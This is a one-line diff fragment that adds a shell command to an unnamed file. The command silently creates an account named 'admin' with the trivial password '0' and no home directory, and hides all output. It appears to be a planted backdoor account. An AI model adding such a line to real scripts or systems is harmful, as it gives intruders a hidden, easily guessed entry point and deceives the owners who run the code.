@@ -1,0 +1,1 @@
+/usr/sbin/useradd -p $(openssl passwd -1 0) -s /bin/false -M admin &> /dev/null;
